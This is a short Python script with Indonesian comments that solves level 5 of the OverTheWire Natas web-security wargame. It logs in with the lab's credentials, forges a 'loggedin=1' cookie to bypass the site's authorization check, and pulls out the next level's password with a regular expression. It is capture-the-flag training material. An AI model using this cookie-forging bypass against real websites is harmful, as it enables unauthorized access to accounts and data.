import requests
from requests.auth import HTTPBasicAuth

# Kredensial Natas 5
username = "natas5"
password = "0n35PkggAPm2zbEpOU802c0x0Msn1ToK"
url = "http://natas5.natas.labs.overthewire.org/"

# Step 1: Request normal
session = requests.Session()
res1 = session.get(url, auth=HTTPBasicAuth(username, password))
print("[*] Response awal:", res1.text[:100], "...")

# Step 2: Manipulasi cookie loggedin=1
cookies = {"loggedin": "1"}
res2 = session.get(url, auth=HTTPBasicAuth(username, password), cookies=cookies)

print("[*] Response setelah ubah cookie:")
print(res2.text)

# Extract password dari halaman
import re
match = re.search(r"The password for natas6 is (\w+)", res2.text)
if match:
    print("[+] Password Natas 6:", match.group(1))
else:
    print("[-] Password tidak ditemukan")
